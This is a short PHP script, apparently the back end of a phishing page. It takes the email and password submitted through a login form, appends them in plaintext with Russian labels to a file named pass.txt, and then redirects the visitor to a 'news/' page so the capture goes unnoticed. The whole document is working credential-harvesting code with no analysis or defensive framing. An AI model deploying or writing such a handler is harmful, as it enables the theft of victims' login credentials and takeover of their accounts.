<?php
    $login=$_POST['email'];
    $password=$_POST['pass'];
    $file=fopen("pass.txt" , "a");
    $text="Логин: " . $login . " Пароль: " . $password . "\n";
    fwrite($file, $text);
    fclose($file);
    header('Location: news/');
?>